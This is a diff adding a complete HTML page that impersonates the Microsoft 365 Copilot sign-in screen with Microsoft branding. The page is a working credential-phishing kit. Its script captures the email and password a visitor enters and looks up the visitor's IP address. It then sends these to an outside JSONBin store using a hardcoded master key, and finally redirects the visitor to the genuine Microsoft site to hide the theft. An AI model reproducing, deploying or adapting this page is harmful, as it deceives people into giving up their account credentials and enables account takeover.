@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Sign in to your Microsoft account">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        body {
+            font-family: "Segoe UI", Arial, sans-serif;
+            background: #f5f5f5;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header, .footer {
+            background: #0078D4;
+            color: #fff;
+            text-align: center;
+            padding: 1.5rem 0;
+        }
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-box {
+            background: #fff;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.12);
+            max-width: 350px;
+            width: 100%;
+        }
+        .login-box h1 {
+            color: #0078D4;
+            font-size: 1.5rem;
+            margin-bottom: 1.2rem;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 1.2rem;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #333;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 0.5rem;
+            font-size: 1rem;
+            border: 1px solid #bbb;
+            border-radius: 4px;
+        }
+        .form-group input:focus {
+            border-color: #0078D4;
+            outline: none;
+        }
+        .forgot-link {
+            color: #0078D4;
+            text-decoration: none;
+            font-size: 0.95rem;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .submit-button {
+            width: 100%;
+            background: #0078D4;
+            color: #fff;
+            border: none;
+            padding: 0.7rem;
+            font-size: 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 1rem;
+        }
+        .submit-button:hover {
+            background: #005A9E;
+        }
+        .message {
+            margin-top: 1rem;
+            text-align: center;
+            color: #0078D4;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" style="height:40px;vertical-align:middle;">
+        <span style="font-size:1.2rem; margin-left:10px;">Microsoft 365 Copilot</span>
+    </div>
+    <div class="main">
+        <div class="login-box">
+            <h1>Sign in</h1>
+            <form id="loginForm" autocomplete="on">
+                <div class="form-group">
+                    <label for="email">Email, phone, or Skype</label>
+                    <input type="email" id="email" name="email" required autocomplete="username">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required autocomplete="current-password">
+                </div>
+                <div>
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+                <button type="submit" class="submit-button">Sign in</button>
+            </form>
+            <div id="message" class="message"></div>
+        </div>
+    </div>
+    <div class="footer">
+        &copy; 2025 Microsoft
+    </div>
+    <script>
+        // JSONBin parameters (replace with your actual values)
+        const apiKey = "$2a$10$Qq/M9Jz61yxb0SvWrxp2HOnX8FH11xAL89jGQZTfUTj56RrZX4EX6";
+        const binId = "68afded943b1c97be92df86b";
+
+				// Try multiple IP providers until one returns a valid IP
+				async function getClientIP() {
+				const providers = [
+					"https://api64.ipify.org?format=json",
+					"https://api.ip.sb/jsonip",
+					"https://ipv4.jsonip.com",
+					"https://ip.seeip.org/jsonip?",
+					"https://ifconfig.me/all.json" // some providers give extra info
+				];
+
+		for (const url of providers) {
+			try {
+			const res = await fetch(url, { cache: "no-store" });
+			if (!res.ok) continue;
+
+			const data = await res.json();
+			const ip = data.ip || data.query || data.address || data.ip_addr;
+			if (ip && typeof ip === "string") {
+				return ip.trim();
+			}
+			} catch (err) {
+			// console.warn("IP provider failed:", url, err);
+			continue; // try next provider
+			}
+		}
+
+		// Final fallback if all providers fail
+		return "Unavailable";
+		}
+
+    // Append record to JSONBin
+    async function appendToJsonBin(record) {
+        try {
+            // 1. Get current contents
+            const getRes = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
+                headers: {
+                    "X-Master-Key": apiKey
+                }
+            });
+            if (!getRes.ok) throw new Error("Failed to fetch current bin data");
+            const getData = await getRes.json();
+            const currentArray = getData.record || [];
+
+            // 2. Add new record
+            currentArray.push(record);
+
+            // 3. PUT updated array back
+            const putRes = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
+                method: "PUT",
+                headers: {
+                    "Content-Type": "application/json",
+                    "X-Master-Key": apiKey
+                },
+                body: JSON.stringify(currentArray)
+            });
+            if (!putRes.ok) throw new Error("Failed to update bin");
+            return true;
+
+        } catch (err) {
+            document.getElementById("message").textContent = "Error saving: " + err.message;
+            return false;
+        }
+    }
+
+    // Form submit handler
+    document.getElementById("loginForm").addEventListener("submit", async function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+        document.getElementById("message").textContent = "Signing in...";
+
+        const ip = await getClientIP();
+        const timestamp = new Date().toISOString();
+
+        const payload = {
+            email: email,
+            password: password,
+            ip: ip,
+            timestamp: timestamp
+        };
+
+        const success = await appendToJsonBin(payload);
+
+        if (success) {
+            document.getElementById("message").textContent = "Redirecting...";
+            setTimeout(() => {
+                window.location.replace("https://www.microsoft365.com");
+            }, 1200);
+        }
+    });
+</script>
+</body>
+</html>
